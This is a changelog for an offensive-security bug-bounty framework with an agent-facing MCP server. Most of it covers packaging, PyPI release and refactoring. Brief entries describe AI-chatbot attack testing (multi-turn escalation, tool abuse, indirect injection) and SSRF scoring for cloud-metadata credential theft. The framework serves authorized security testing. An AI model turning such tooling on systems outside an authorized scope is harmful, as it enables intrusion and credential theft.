# Changelog

- [Unreleased](#unreleased) — post-0.7.1 distribution + cleanup pass + **first PyPI publication as `boba-hunter` 0.7.1** (the `boba` name was taken on PyPI by an unrelated package; import name and CLI command stay `boba`). Also: pyproject version sync (0.2.9→0.7.1) and dev bump to 0.8.0.dev0, `boba-mcp` friendly missing-extra error, README install block (`[mcp]`/`[oob]`/`[dev]` extras + `playwright install chromium`), roadmap V4→done + MCP/V5 entries, deprecated `typer[all]` extra dropped (warning gone), ruff format drift cleanup across 19 files, `[Unreleased]` changelog scaffolding, `readme = "README.md"` added to pyproject so the PyPI project page actually renders. 0 new tests, 0 regressions (840 tests)
- [0.7.1](#071--mcp-server-hardening) — 8 defensive fixes across MCP server: `raw_stderr` None crash, port env-var guard, SSRF injection-point falsy check, OOB/shutdown exception narrowing, browser session-not-found error, platform validation, enum reconstruction safety. 0 new tests, 0 regressions (840 tests)
- [0.7.0](#070--mcp-server) — MCP server exposing all 65 Boba tools as native MCP tool calls. FastMCP, STDIO + streamable-http transports, resource lifecycle management. 0 library changes, 117 new tests, 0 regressions (839 tests)
- [0.6.3](#063--context-module-split) — `context.py` (2,204 lines) → `context/` package (14 files, 2,399 lines). Mixin-based split: 11 mixins, 70 methods, zero behaviour change. 0 new tests, 0 regressions (722 tests)
- [0.6.2](#062--correctness-fixes-scoring-coverage-chaining-temp-files) — 5 correctness fixes: CVSS cloud metadata (confidentiality+integrity), coverage host filter gate, cross-host chaining ordering, temp file leaks (ffuf/arjun), dead code (test_xss/test_sqli). 0 new tests, 0 regressions (722 tests)
- [0.6.1](#061--bug-fixes-race-test-type--json-import) — 2 bugs in vuln.py: `test_race` inconsistent type on total failure (dedup key), `_bodies_similar` shadowed json import (hot path overhead). 0 new tests, 0 regressions (722 tests)
- [0.6.0](#060--v4-phase-7-multipart-file-upload) — `upload()` on HttpClient for multipart/form-data file upload testing. Unrestricted upload, path traversal via filename, and SVG/HTML XSS now first-class operations. 1 method, 8 new tests, 0 regressions (722 tests)
- [0.5.10](#0510--python-312-deprecation-fixes) — `asyncio.get_running_loop()` across all 15 deadline call sites in vuln.py, module-level credential pattern compilation. 0 new tests, 0 regressions (714 tests)
- [0.5.9](#059--post-audit-correctness-fixes) — 3 correctness fixes from independent multi-agent audit: Kiterunner boost raw-URL lookup, `upsert_api_endpoint` silent host/path drop, `_redact` threshold. 5 new tests, 0 regressions (714 tests)
- [0.5.8](#058--code-quality-audit--correctness-fixes) — 4 correctness fixes from production-readiness audit: `log_tool_run` missing hunt guard, PITCHFORK silent empty fuzz, nuclei string-reference drop, httpx port sentinel. 0 regressions (709 tests)
- [0.5.7](#057--v4-enrichment-prod-readiness-fixes) — 8 production-readiness fixes across gitleaks target handling, method-aware prioritization, AI conversation detection, secret dedupe, and IDOR WAF signaling. 10 new tests, 0 regressions (709 tests)
- [0.5.6](#056--v4-phase-6-ai-multi-turn-conversation) — `test_ai_conversation()` for POST/JSON chatbot testing. Multi-turn escalation, tool abuse, indirect injection, credential leak detection. 1 function, ~11 new tests, 0 regressions (699 tests)
- [0.5.5](#055--v4-phase-5-api-surface-mapping) — Kiterunner adapter discovers REST endpoints invisible to crawlers. `api_endpoints` table, prioritization integration, CLI commands. 1 adapter, 1 table, ~30 new tests, 0 regressions (688 tests)
- [0.5.4](#054--v4-phase-4-secret-scanning) — Gitleaks adapter scans git repos for leaked credentials. `secrets` table with redaction, type classification, CLI commands. 1 adapter, 1 table, ~31 new tests, 0 regressions (658 tests)
- [0.5.3](#053--v4-phase-3-parameter-discovery) — Arjun adapter for hidden parameter discovery, `parameters` table, prioritization integration, CLI commands. 1 adapter, 1 table, 0 regressions (627 tests)
- [0.5.2](#052--v4-phase-2-ai-chain-rules) — 4 AI-aware chain rules, stable evidence type identifiers. Prompt injection findings now chain with XSS, auth bypass, tool abuse. 0 regressions (608 tests)
- [0.5.1](#051--v4-phase-1-waf-detection) — `waf_detected` signal on VulnTestResult. All 11 vuln engines now distinguish WAF blocking from clean endpoints. 0 regressions (600 tests)
- [0.5.0](#050--documentation--agent-readiness) — Agent orientation guide, V4 implementation plan, README/TLDR updated to reflect V3 completion. Documentation milestone, 0 code changes, 0 regressions (592 tests)
- [0.4.2](#042--prod-gate-confidence-accuracy--report-integrity) — Auth confidence inverted, PoC file numbering desync on missing/failed records, Bugcrowd formatter empty steps on single-step reports, missing FK CASCADE on dedup_groups/reports. 4 fixes, 0 regressions (592 tests)
- [0.4.1](#041--prod-gate-detection-correctness--id-integrity) — Redirect detection completely broken (follow_redirects=True), upsert lastrowid undefined on update path, cross-type dedup suppressing distinct vulns, DOM XSS early exit, false chain rules, step ordering, adapter hardening. 11 fixes, 0 regressions (592 tests)
- [0.4.0](#040--prod-gate-final-boundary-safety--cache-consistency) — Session cache invalidation bug, nuclei/httpx/whatweb type coercion at parse boundaries, evidence serialization clarity, migration idempotency guard. 6 fixes, 0 regressions (592 tests)
- [0.3.9](#039--prod-gate-data-consistency--api-contract-fixes) — Dedup group completeness, report evidence_refs population, PoC HTTP status formatting, httpx IP/port normalization, nuclei type safety, chain key robustness. 7 fixes, 0 regressions (592 tests)
- [0.3.8](#038--pre-prod-data-integrity--security-hardening) — Evidence `[]` not `"null"`, migration context manager, report NULL dedup, stored XSS scoring, extra_args flag injection block, source provenance, hunt ID retry, CIDR-port fix. 10 fixes (592 tests)
- [0.3.7](#037--production-hardening--error-visibility) — Finding persistence → ERROR, coverage → WARNING, missing-binary graceful exit (127/126), HuntNotFoundError on invalid queries, WAL failure → RuntimeError. 5 fixes + 13 tests (592 tests)
- [0.3.6](#036--data-integrity--detection-accuracy) — Upsert COALESCE guards, race condition 304/429 filtering, mass assignment non-JSON logging, XSS DOM full-param testing, BrokenPipeError exit. 7 fixes (579 tests)
- [0.3.5](#035--final-prod-gate) — Report NULL dedup, scope on all 12 vuln tests, chain validation preservation, CSRF/SQLi/auth/XSS detection fixes, migration atomicity, subprocess zombie guard, OOB safety. 15 fixes (579 tests)
- [0.3.4](#034--prod-readiness-review) — Chain deletion safety, race gather crash, scope empty-string bypass, ffuf empty-targets, dedup O(n)→O(1) via json_each, finding persistence pipeline, PoC I/O resilience. 9 fixes (579 tests)
- [0.3.3](#033--final-pre-prod-hardening) — json_array_merge SQLite function, findings method-aware UNIQUE, IDOR scope enforcement, CIDR exclusion symmetry, vuln test deadlines, recon.urls failure signaling. 8 fixes (579 tests)
- [0.3.2](#032--production-readiness-sweep) — Report UNIQUE NULL, evidence merge corruption, browser stale-auth, CSRF/IDOR/auth detection, coverage filters, cross-type dedup, adapter null-safety, OOM pre-check. 25 fixes (579 tests)
- [0.3.1](#031--pre-production-hardening) — CVSS formula, CLI coverage, scope scheme bypass, IDOR/race/SQLi/CSRF/AI detection, host upsert COALESCE, finding NULL dedup, chain idempotency. 19 fixes (579 tests)
- [0.3.0](#030--intelligence-analysis-chaining--reporting) — V3: analysis engine, reporting pipeline, 6 new vuln tools (race, redirect, CSRF, mass assignment, reset, AI). 4 tables, 2 packages, 133 new tests (579 total)
- [0.2.21](#0221--nuclei-collision--login-deepcopy--idor-empty-body--sqli-confirm) — Nuclei collision fix, session deep-copy, IDOR empty-body, SQLi confirmation, HuntManager context manager. 8 fixes + 12 tests (446 total)
- [0.2.20](#0220--evidence-merge--session-create-deepcopy--fuzz-warnings) — Evidence/request_ids merge, session deep-copy, fuzz missing-payload warnings. 3 fixes + 5 tests (434 total)
- [0.2.19](#0219--scope-bypass-fuzz-baseline--session-cache-safety) — URL prefix scope bypass, fuzz baseline stripping, session cache safety, browser body cap. 5 fixes + 8 tests (429 total)
- [0.2.18](#0218--scope-pre-filter-entity-type-fix) — Critical: pre_filter_targets entity type broke 4 adapters, now uses `"auto"`. 6 tests (421 total)
- [0.2.17](#0217--adapter-parse-guards--finding-flag-preservation) — Adapter type guards, JSON_OBJECT fix, finding flag preservation, HttpClient 50 MB body cap. 27 tests (415 total)
- [0.2.16](#0216--atomic-upserts--cli-context-manager-dedup) — Atomic upserts, PRAGMA validation, scope default-deny, browser lock, CLI `_managed` dedup, SQLi baseline guard. 27 tests (388 total)
- [0.2.15](#0215--upsert-commit-safety--detection-hardening) — Upsert commit safety, SSRF/IDOR/XSS hardening, CLI helpers, adapter urlparse safety, waybackurls concurrency. 34 tests (361 total)
- [0.2.14](#0214--idor-json-comparison--cli-dedup--enum-crawl) — JSON-aware IDOR comparison, CLI dedup, `enum crawl` command, XSS HTML entities, OOB enrichment, scan deepcopy. 41 tests (327 total)
- [0.2.13](#0213--false-positive-reduction--gau-arg_max-fix) — IDOR/SQLi false-positive reduction, fuzz baseline, gau ARG_MAX, scope filter consistency, CLI test coverage. 21 tests (286 total)
- [0.2.12](#0212--injection-prevention--fuzz-header-substitution) — LIKE/gau injection prevention, IDOR/SSRF false-positive reduction, fuzz header substitution, CLI error handling. 59 tests (265 total)
- [0.2.11](#0211--scope-yaml-null-fix--test-coverage-expansion) — Scope YAML null, OOB guard/dedup, subprocess timeout, SQLi case sensitivity. 90 new tests (206 total)
- [0.2.10](#0210--finding-staleness--hunt-state-validation--timeouts) — Finding stale flags, hunt state validation, MSSQL payload, OOB poll drift, navigate/login timeout, IDOR body comparison. 10 fixes
- [0.2.9](#029--httpclient-connection-leak--jwt-padding-fix) — HttpClient connection leak fix, JWT padding bug, null-safe tech flattening, whatweb type guard, body similarity boundary, str() command args, XSS DOM canary, 7 fixes total
- [0.2.8](#028--scope-url-bypass--httpclient-resilience--sqli-timing) — Scope URL prefix bypass, HttpClient network resilience, SQLi multi-baseline timing, SSRF/XSS false-positive reduction, OOB fallback fix, 12 fixes total
- [0.2.7](#027--safe_close-recursion--oob-performance--cluster-bomb-cap) — Critical _safe_close recursion fix, SSRF false-positive cleanup, XSS decoded reflection, OOB O(n*m) fix, session deepcopy, cluster bomb cap, CSS escape, 15 fixes total
- [0.2.6](#026--per-request-timeout--time-based-sqli--jwt-hardening) — Per-request timeout, time-based SQLi, XSS partial reflection, JWT exceptions, IDOR enumeration, CLI safety, 16 fixes total
- [0.2.5](#025--subprocess-exit-codes--scope-url-bypass--adapter-logging) — Subprocess exit code fix, scope URL bypass fix, OOB warning, adapter exit code logging, browser timing, compare bytes
- [0.2.4](#024--operational-robustness) — Persistent HTTP client, body_text truncation fix, diagnostic logging, SQLi baseline fix
- [0.2.3](#023--data-integrity--resource-safety) — Technology commit fix, broader parse error handling, HuntContext context manager, lint cleanup, gather partial results
- [0.2.2](#022--detection-correctness--defensive-robustness) — IDOR URL path fix, SSRF indicators, auth regex, XSS reflection, subprocess signaling, CLI hardening
- [0.2.1](#021--code-quality--correctness) — IPv6 scope handling, URL encoding for payloads, JSON decode safety, IDOR similarity, SQLi threshold, output bounding
- [0.2.0](#020--interaction-browser-http--vulnerability-testing) — Browser automation, HTTP client, session management, OOB listeners, 5 vuln test tools, Nuclei adapter, CLI extensions
- [0.1.0](#010--foundation-recon--enumeration) — Core framework, 8 tool adapters, scope engine, SQLite persistence, CLI

---

## Unreleased

**Target:** 0.8.0
**Scope:** Post-0.7.1 distribution polish and pre-feature cleanup. Sets up the repo so the next entry under this header can be the V5 continuous monitoring loop without dragging release-hygiene debt with it. 0 new tests, 0 regressions (840 tests).

### Distribution

1. **`pyproject.toml` version sync:** `version` was stuck at `0.2.9` while the changelog had marched to `0.7.1` — development had been changelog-driven, not release-driven. Bumped to `0.7.1`, tagged `v0.7.1`, then bumped to `0.8.0.dev0` per PEP 440 so subsequent commits aren't ambiguously labeled as the released version. First real git tag in the project's history.

2. **`boba-mcp` friendly missing-extra error:** the `boba-mcp` console script was registered unconditionally in `pyproject.toml`, but the underlying `mcp` package is gated behind the `[mcp]` optional extra. A user running `pip install boba` (without the extra) followed by `boba-mcp` would hit a raw `ImportError` traceback. Wrapped the deferred `from boba.mcp.server import mcp` in a try/except that raises `SystemExit` with `"boba-mcp requires the 'mcp' optional dependency. Install with: pip install 'boba[mcp]'"`. Verified in a fresh venv: clean error message, no traceback.

3. **README install block:** rewrote the Quickstart to document the four install paths (`pip install boba`, `'boba[mcp]'`, `'boba[oob]'`, `-e '.[dev]'`), added the required `playwright install chromium` bootstrap, and pointed at the External Tools table for the non-Python binaries (`subfinder`, `nuclei`, etc.). The old block only showed the dev install.

### Cleanup

4. **Deprecated `typer[all]` extra dropped:** `typer[all]>=0.9` → `typer>=0.12`. Modern typer (≥0.12) folded `shellingham`/`colorama`/`rich` into the base install and removed the `[all]` extra entirely. The old declaration was producing `WARNING: typer 0.24.1 does not provide the extra 'all'` on every fresh install. Bumped the floor to `0.12` so the fix is unambiguously correct (a weaker `typer>=0.9` would technically be wrong for 0.9–0.11 users). Verified clean install in a throwaway venv: 0 warnings, typer 0.24.1 still resolves.

5. **README roadmap refresh:** V4 was unchecked despite being shipped across 0.5.3–0.6.0 (arjun, kiterunner, gitleaks, multipart upload, AI multi-turn, WAF detection, AI chain rules — fourteen releases of unticked work). Marked V4 done with the actual deliverables, added an MCP server entry for 0.7.0, and added V5 as the explicit "continuous monitoring loop (snapshot diffing, scheduled re-runs, new-asset alerts)" line. The roadmap now matches reality and sets the contract for what 0.8.0 will be.

6. **`pytest # 840 tests` → `pytest # full test suite`:** removed the hardcoded test count from the README dev block. Hardcoded counts are a ratchet — they drift on every release and stale ones look unprofessional. The number was already wrong on the previous release; removing it makes drift impossible.

7. **ruff format drift cleanup:** `ruff format --check` was failing on 19 files (8 src, 11 tests) — pre-existing drift accumulated since the last format pass. Reformatted as a standalone mechanical commit (`647e0c4`) before the release commit so the release diff stays focused on actual changes. Zero behaviour change, 840 tests still passing.

8. **`[Unreleased]` changelog scaffolding:** added an `[Unreleased]` section at the top of the changelog (both index and body) so future work has a place to land before tag time, instead of being reconstructed from `git log` when cutting a release. This entry is the first use of that scaffolding.

### PyPI publication

9. **First real PyPI release — `boba-hunter` 0.7.1:** the project is now installable via `pip install boba-hunter` at <https://pypi.org/project/boba-hunter/0.7.1/>. Published from a detached checkout of the `v0.7.1` tag with two working-tree-only edits (distribution rename + `readme = "README.md"`) fed into `python -m build`, validated with `twine check` (clean after the README fix, previously warning about missing `long_description`), uploaded via `twine upload` using an account-scoped API token, smoke-tested in a throwaway venv (`pip install boba-hunter==0.7.1` → `boba --help` resolves, `boba-mcp` without the `[mcp]` extra fires the friendly error). Neither the wheel nor the sdist includes commits past `v0.7.1`, so the published artifact exactly matches the tag content plus the two metadata deltas — no source changes leaked in. The detached-HEAD edits were discarded after the upload; the source-tree rename is a separate commit on `main` documented below.

10. **Distribution name: `boba` → `boba-hunter` (permanent, PyPI-only):** the `boba` PyPI name is owned by an unrelated package (confirmed via the PyPI JSON API, which is the authoritative check — the HTML UI returns 200 for nonexistent projects and produces false positives). Swapped `[project] name` in `pyproject.toml` to `boba-hunter`. The **import name** and the **CLI command** are unchanged — every `import boba` in `src/` and `tests/` still works because the import name is independent of the PyPI distribution name (same pattern as `beautifulsoup4`/`bs4` or `python-dateutil`/`dateutil`). Users type `pip install boba-hunter` then run `boba ...`. Zero Python source changes were required — only four metadata files moved. 840 tests still passing.

11. **Missing-extra error message corrected:** `src/boba/mcp/__init__.py` previously raised `SystemExit("... pip install 'boba[mcp]'")`. Post-rename, copy-pasting that hint would install a completely different package from PyPI (or fail). Fixed to `pip install 'boba-hunter[mcp]'`. The import name in the error text is unchanged — it's still checking for the `mcp` module, not the `boba-hunter` distribution. No test asserted the old message string, so the rename was behaviorally safe.

12. **README + `docs/mcp-setup.md` install blocks updated:** `pip install boba` → `pip install boba-hunter` across all three extras (base / `[mcp]` / `[oob]`). Added a parenthetical note in the README that the import name stays `boba` — this asymmetry is common in the packaging ecosystem but worth flagging explicitly so users don't wonder why `pip install boba-hunter` lets them `import boba`. Historical docs (`docs/changelog.md` body below this entry, `docs/executing/0.7.1-release-plan.md`, `docs/completions/mcp-server-implementation-plan.md`) were **intentionally not rewritten** — they're append-only records of what was true at their respective points in time, and rewriting them would misrepresent the project's history.

### Pending

Not yet done as of this entry — tracked here so the next session can pick them up without re-deriving context:

- **Token rotation (account-scoped → project-scoped):** the PyPI API token used for the initial upload is scoped to "Entire account (all projects)" because `boba-hunter` didn't exist on PyPI at creation time, so there was nothing to scope to. Now that the project exists, create a new token at <https://pypi.org/manage/account/token/> with **Scope: Project → boba-hunter**, swap it into `~/.pypirc`, verify with a dry-run, then delete the old account-scoped token. Reduces blast radius on leak from "publish malicious versions of any of my PyPI projects" to "publish malicious versions of `boba-hunter` only."

- **Mystery token investigation:** an older account-scoped PyPI token (created `2026-03-19`, first embedded UUID `b1cb28ba-013c-46ff-af20-3e028f8dd775`) was discovered already sitting in `~/.pypirc` at the start of this session, with no corresponding memory of its creation. Audit the token list on the PyPI account page; if unrecognized, revoke.

- **Push `main` to `origin`:** the post-rename commit (`5792d96`) is local-only; `origin/main` does not yet know about the distribution rename. Until pushed, cloning the repo fresh will produce a `pyproject.toml` that still says `name = "boba"` — which would build a wheel that PyPI would reject as a different package on the next upload attempt.

- **Stale tooling warnings in the published wheel:** users installing `boba-hunter==0.7.1` currently see `WARNING: typer 0.24.1 does not provide the extra 'all'` because the `typer[all]` → `typer>=0.12` fix landed in commit `22bde41` *after* the `v0.7.1` tag. Cosmetic, not release-blocking, but a candidate to fix in 0.7.2 or fold into 0.8.0 (alongside a few other small post-0.7.1 improvements).

- **Move `docs/executing/0.7.1-release-plan.md` → `docs/completions/`:** every step in the plan has been executed (including Step 6 PyPI publication and Step 7 GitHub release, both of which this session confirmed). Keeping it in `executing/` is misleading — that directory should only contain in-flight work. Low priority, but a small hygiene win for the next contributor.

### Modified files

- `pyproject.toml` — version, typer dep, **`name = "boba-hunter"`**, `readme = "README.md"`
- `README.md` — install block, roadmap, dev block test count, **install commands updated for `boba-hunter` rename**
- `docs/mcp-setup.md` — **install block updated for `boba-hunter` rename**
- `src/boba/mcp/__init__.py` — friendly missing-extra error, **error text points at `boba-hunter[mcp]`**
- `docs/changelog.md` — `[Unreleased]` scaffolding + **this PyPI publication entry**
- `docs/executing/0.7.1-release-plan.md` — new release plan doc
- 19 files reformatted by ruff (no behaviour change)

### Commits

- `647e0c4` — ruff format drift cleanup (19 files)
- `e8af31c` — release plan in `docs/executing/`
- `2ffcc69` — **Release 0.7.1** (tagged `v0.7.1`, this is what PyPI published)
- `9bc4764` — post-release hygiene (`0.8.0.dev0`, `[Unreleased]` scaffolding)
- `22bde41` — typer extra drop, README roadmap, test-count removal
- `589be42` — `[Unreleased]` entry covering the distribution + cleanup pass (items 1–8 above)
- `5792d96` — **post-PyPI rename on `main`:** `boba` → `boba-hunter` in `pyproject.toml`, README, `docs/mcp-setup.md`, and the `boba-mcp` error message; `readme = "README.md"` added to pyproject (items 9–12 above). *Not yet pushed to `origin`.*

### External state changed

- **PyPI:** `boba-hunter` project created; `0.7.1` uploaded (wheel + sdist). Immutable — cannot be deleted, can only be yanked.
- **GitHub:** release at <https://github.com/kaminocorp/boba/releases/tag/v0.7.1> already existed from `2026-04-07` (created by a prior session, not this one); this session confirmed its content matches what we would have posted and took no action.
- **Git tags:** `v0.7.1` already pushed to `origin` (hash `69b97385b406be874c6ec383902bbfc64b68187e`); verified via `git ls-remote --tags origin v0.7.1`.
- **Local config:** `~/.pypirc` updated with a fresh account-scoped API token and `chmod 600`'d (was previously `rw-r--r--`, world-readable). Old token from `2026-03-19` overwritten in the file — see "Mystery token investigation" in Pending.

---



## 0.7.1 — MCP Server Hardening

**Date:** 2026-04-06
**Scope:** 8 defensive fixes across the MCP server layer. 3 crash bugs, 3 silent-failure fixes, 2 robustness improvements. 0 new tests, 0 regressions (840 tests).

### Crash bugs fixed

1. **`serializers.py` — `raw_stderr` None crash:** `result.raw_stderr[:500]` crashes with `TypeError` when stderr is `None` (e.g., tool binary not found, segfault). Fixed: `(result.raw_stderr or "")[:500]`.

2. **`__init__.py` — port env-var crash:** `int(os.environ.get("BOBA_MCP_PORT", "3000"))` crashes with `ValueError` on non-numeric input. Fixed: try/except fallback to default 3000.

3. **`tools_vuln.py` — SSRF injection-point falsy check:** `if param` treats empty string `""` as no param, skipping injection point setup. Fixed: `if param is not None`.

### Silent-failure fixes

4. **`tools_interaction.py` / `tools_vuln.py` — OOB start exception narrowing:** Bare `except Exception: pass` on `oob.start()` masked real errors (permission denied, network failure) behind "already started" assumption. Fixed: catch only `RuntimeError`.

5. **`tools_interaction.py` — browser session-not-found:** `browser_navigate` silently skipped auth when session name didn't resolve, proceeding unauthenticated with no signal. Fixed: raises `ValueError` with clear message.

6. **`tools_reporting.py` — platform validation:** Invalid platform string (e.g., `"jira"`) silently fell back to markdown format. Fixed: raises `ValueError` listing valid platforms.

### Robustness improvements

7. **`resources.py` — shutdown logging:** Replaced bare `except Exception: pass` in shutdown with `logger.debug(…, exc_info=True)` on all 3 resource teardown paths (HTTP clients, browser, OOB managers). Operators can now diagnose resource leaks.

8. **`tools_reporting.py` — enum reconstruction safety:** `Severity()`, `Platform()`, `ReportStatus()` construction from DB row values now uses try/except with safe defaults instead of crashing on invalid values.

### Modified files

- `src/boba/mcp/__init__.py` — port parsing guard
- `src/boba/mcp/resources.py` — logging import, shutdown exception logging
- `src/boba/mcp/serializers.py` — None-safe stderr slicing
- `src/boba/mcp/tools_interaction.py` — OOB exception narrowing, session-not-found error, session merge clarity
- `src/boba/mcp/tools_vuln.py` — injection-point `is not None` check, OOB exception narrowing
- `src/boba/mcp/tools_reporting.py` — platform validation, safe enum reconstruction

---

## 0.7.0 — MCP Server

**Date:** 2026-04-06
**Scope:** MCP (Model Context Protocol) server exposing all 65 Boba tools as native MCP tool calls. Zero modifications to existing library code. 117 new tests, 0 regressions (839 total, up from 722).

### What

A FastMCP server (`src/boba/mcp/`) that wraps every Boba library function as a typed MCP tool. Agents call `recon_subdomains(hunt_id, domains=["example.com"])` instead of `boba recon subdomains $HUNT -d example.com -f json`. Supports STDIO (local agents) and streamable-http (remote agents) transports.

### Tools (65)

| Category | Count |
|---|---|
| Hunt management | 6 |
| Reconnaissance | 5 |
| Enumeration | 2 |
| Scanning | 1 |
| Context queries | 11 |
| Session management | 7 |
| HTTP client | 4 |
| Browser | 3 |
| OOB listeners | 3 |
| Vulnerability testing | 12 |
| Analysis | 6 |
| Reporting | 5 |

### Architecture

```
CLI (Typer) ──► Boba Library (tools, context, adapters)
MCP Server  ──► Boba Library (tools, context, adapters)
```

Both are thin wrappers calling the same async library functions. The MCP server adds stateful resource management — HTTP clients, browser, sessions, and OOB listeners persist across tool calls within a session.

### New files

- `src/boba/mcp/` — 10 modules: `__init__.py`, `server.py`, `resources.py`, `serializers.py`, `tools_hunt.py`, `tools_recon.py`, `tools_enum.py`, `tools_scan.py`, `tools_context.py`, `tools_interaction.py`, `tools_vuln.py`, `tools_analysis.py`, `tools_reporting.py`
- `tests/mcp/` — 12 test modules, 117 tests
- `docs/mcp-setup.md` — Agent configuration guide

### Modified files

- `pyproject.toml` — `mcp` optional dep, `boba-mcp` entry point
- `agent-orientation.md` — MCP access section

### Install

```bash
pip install boba[mcp]   # or pip install -e ".[dev]"
boba-mcp                # start STDIO server
```

---

## 0.6.3 — Context Module Split

**Date:** 2026-04-06  
**Scope:** `src/boba/core/context.py` (2,204 lines) → `src/boba/core/context/` package (14 files, 2,399 lines). Zero-behaviour-change refactor. 0 new tests, 0 regressions (722 tests pass).

### Problem

A single `HuntContext` class in one file contained schema DDL (388 lines), connection lifecycle, migration logic, hunt CRUD, 9 entity upserts, 12 query methods, HTTP history, sessions, findings, OOB listeners, coverage tracking, dedup groups, chains, and reports. Every concern was tangled in a 2,204-line file.

### Approach: Mixins

Three alternatives were evaluated — composition (separate objects, forwarded `conn`), partial-class-via-imports, and mixins. **Mixins won** because `HuntContext` has 70 methods that all share `self._conn` (a single SQLite connection) and `self._in_transaction` (a batch flag). Composition would require threading the connection through every call; partial-class imports break IDE navigation. Mixins let each method reference `self._conn` naturally — at runtime `self` is always a fully-composed `HuntContext`.

### File structure

```
src/boba/core/context/
├── __init__.py          157 lines   HuntContext (inherits all mixins), lifecycle, migration
├── _helpers.py           85 lines   _now, _resolve_upsert_id, _parse_json_field, _json_array_merge
├── _schema.py           390 lines   _SCHEMA_SQL DDL constant
├── _hunt_crud.py        119 lines   HuntCrudMixin: create/get/list/update hunt, _row_to_hunt
├── _upserts.py          475 lines   UpsertMixin: 9 entity upserts + upsert_records batch dispatch
├── _queries.py          229 lines   QueryMixin: 12 get_* methods, log_tool_run, get_hunt_stats
├── _http_history.py     150 lines   HttpHistoryMixin: insert/get/query/update HTTP records
├── _sessions.py          96 lines   SessionMixin: upsert/get/delete/touch sessions
├── _findings.py         138 lines   FindingMixin: upsert_finding, get_findings, get_finding_by_id
├── _oob.py               70 lines   OobMixin: insert/update/get OOB listeners
├── _coverage.py         123 lines   CoverageMixin: upsert/get coverage, get_untested_endpoints
├── _dedup.py             97 lines   DedupMixin: dedup groups, is_duplicate, get_canonical_finding
├── _chains.py           105 lines   ChainMixin: upsert/get/delete chains
└── _reports.py          165 lines   ReportMixin: upsert/get/update reports
```

All internal modules are `_`-prefixed — they are implementation details. The only public import path remains `from boba.core.context import HuntContext`.

### Class hierarchy

```python
class HuntContext(
    HuntCrudMixin,      # hunt CRUD + state machine
    UpsertMixin,        # 9 entity upserts + batch dispatch
    QueryMixin,         # 12 get_* methods + tool runs + stats
    HttpHistoryMixin,   # HTTP request/response history
    SessionMixin,       # authenticated session management
    FindingMixin,       # vulnerability findings
    OobMixin,           # out-of-band listener records
    CoverageMixin,      # test coverage tracking
    DedupMixin,         # finding deduplication groups
    ChainMixin,         # attack chain persistence
    ReportMixin,        # vulnerability reports
):
```

`HuntContext.__init__` is the sole constructor — no mixin has `__init__`. All mixins reference `self._conn`, `self._maybe_commit()`, and `self._in_transaction` which are provided by `HuntContext`.

### Mixin stubs

Two mixins (`UpsertMixin`, `CoverageMixin`) call `self._maybe_commit()`, which is defined in `__init__.py`, not in the mixin itself. They include a stub:

```python
def _maybe_commit(self) -> None: ...  # provided by HuntContext
```

`DedupMixin` has a similar stub for `self.get_finding_by_id()` from `FindingMixin` — the only cross-mixin method call in the codebase. MRO ensures all three stubs are shadowed by their real implementations at runtime.

### What stays in `__init__.py`

Connection lifecycle methods stay in `__init__.py` because they manage the shared state all mixins depend on: `__init__`, `_create_tables`, `_maybe_migrate`, `_maybe_commit`, `close`, `__enter__`, `__exit__`.

### Import compatibility

All 20+ callers use `from boba.core.context import HuntContext`. Python resolves `boba.core.context` to `boba/core/context/__init__.py` identically to how it resolved `boba/core/context.py` — zero caller changes required.

One backward-compat re-export: `tests/test_fixes_0214.py` imports `from boba.core.context import _parse_json_field`, which `__init__.py` re-exports from `_helpers.py` via `__all__`.

### Verification

| Check | Result |
|-------|--------|
| Method count | 70/70 — all present in both old and new |
| Top-level functions | 4/4 identical (`_now`, `_resolve_upsert_id`, `_parse_json_field`, `_json_array_merge`) |
| Method body diff | 69/70 identical; 1 expected diff (`_maybe_commit` stub in `UpsertMixin`) |
| `_SCHEMA_SQL` DDL | Identical (character-for-character) |
| Class attributes | `_VALID_TRANSITIONS` in `_hunt_crud.py`, `_STATS_TABLES` in `_queries.py` — both present |
| MRO | 12-class chain; all 3 stubs shadowed by real implementations |
| Import compatibility | `from boba.core.context import HuntContext` and `_parse_json_field` both resolve |
| `__all__` | Exports `HuntContext` and `_parse_json_field` |
| Test suite | **722 passed** in 18.52s — zero regressions |
| Lint | `ruff check` and `ruff format --check` clean across all 14 files |

---

## 0.6.2 — Correctness Fixes: Scoring, Coverage, Chaining, Temp Files

**Date:** 2026-04-06  
**Scope:** 5 correctness fixes across 5 files. 0 new tests, 0 regressions (722 tests pass).

### CORR-1: CVSS cloud metadata scoring — missing confidentiality vector

> `src/boba/analysis/severity.py:162-164`

SSRF with cloud metadata evidence (`169.254.169.254`) only set `integrity="H"`. The primary impact of IMDSv1 credential theft is **confidentiality** (reading IAM credentials, tokens, service account keys), not integrity alone. The base SSRF rule already set `confidentiality="H"`, so the cloud_metadata branch added integrity without explicitly ensuring confidentiality — getting the right CVSS score (CRITICAL) by accident rather than by design.

The fix sets both vectors explicitly with a clarified comment:

```python
# Before
if "cloud_metadata" in evidence_str or "169.254.169.254" in evidence_str:
    metrics["integrity"] = "H"

# After
if "cloud_metadata" in evidence_str or "169.254.169.254" in evidence_str:
    metrics["confidentiality"] = "H"
    metrics["integrity"] = "H"
```

The `confidentiality="H"` assignment is technically redundant (already set in the SSRF base rule), but making it explicit documents the reasoning: cloud metadata access is a confidentiality impact *first*, integrity impact *second*. If the base rule ever changes, the cloud_metadata branch still produces the correct score.

### CORR-2: Coverage host filter gated behind directory check

> `src/boba/analysis/coverage.py:93`

Host filter was only applied when `directories` variable was truthy:

```python
if host and directories:  # host filter only applied when directories exist
    endpoint_set = {ep for ep in endpoint_set if urlparse(ep).hostname == host}
```

When `directories` was empty (no directory scan results for a hunt), the host filter was never applied. A per-host coverage query like "what endpoints have we tested on `api.target.com`?" would return endpoints from *all* hosts mixed together — inflating coverage counts and producing misleading reports.

The `directories` variable was irrelevant to whether host filtering should occur — it was just coincidentally truthy in most test scenarios (which is why this wasn't caught earlier).

**Fix:** Removed the `directories` guard:

```python
if host:
    endpoint_set = {ep for ep in endpoint_set if urlparse(ep).hostname == host}
```

### CORR-3: Chaining picks arbitrary finding for cross-host rules

> `src/boba/analysis/chaining.py:311-322`

For cross-host chain rules (e.g., `redirect_to_ssrf`), the code picked the first finding of each required type:

```python
all_findings.append(type_matches[rtype][0])  # always picks first
```

`type_matches[rtype]` is populated from a database query with no guaranteed ordering. The selection was effectively random — a low-confidence, INFO-severity SSRF could anchor a chain even when a confirmed, HIGH-severity SSRF existed for a different host.

**Fix:** Sort candidates by severity (descending) then confidence (descending) before selecting:

```python
